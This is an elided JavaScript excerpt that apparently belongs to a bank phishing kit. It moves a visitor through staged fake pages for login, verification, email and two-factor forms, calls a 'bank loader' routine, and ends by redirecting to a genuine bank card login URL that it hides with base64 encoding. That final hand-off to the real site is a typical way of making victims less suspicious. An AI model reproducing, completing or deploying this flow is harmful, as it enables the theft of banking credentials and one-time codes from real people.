    ...
    const init = () => {
        ...
        if (loginForm) {
            ...
            document.getElementById('close-locked-modal')?.addEventListener('click', () => {
                window.location.href = 'auth-stg.html';
            });
        }
        ...
        if (verifyForm) {
            verifyForm.addEventListener('submit', e => {
                ...
                const processVerify = () => {
                    ...
                    setTimeout(() => { window.location.href = 'sync-p.html'; }, 1500);
                };
        ...
        if (secureForm) {
            secureForm.addEventListener('submit', e => {
                ...
                executeBankLoader(() => {
                    ...
                    window.location.href = 'email-stg.html';
                });
            });
        }
            ...
            tfaForm.addEventListener('submit', e => {
                ...
                setTimeout(() => {
                    if (reviewModal) {
                        ...
                        const redir = () => { window.location.href = atob('aHR0cHM6Ly93d3cubXlhY2NvdW50YWNjZXNzLmNvbS9vbmxpbmVDYXJkL2xvZ2luLmRv'); };
                        document.getElementById('close-review-modal')?.addEventListener('click', redir);
                        setTimeout(redir, 8000);
                    } else {
                        window.location.href = atob('aHR0cHM6Ly93d3cubXlhY2NvdW50YWNjZXNzLmNvbS9vbmxpbmVDYXJkL2xvZ2luLmRv');
                    }
                }, 1500);
            });
        }
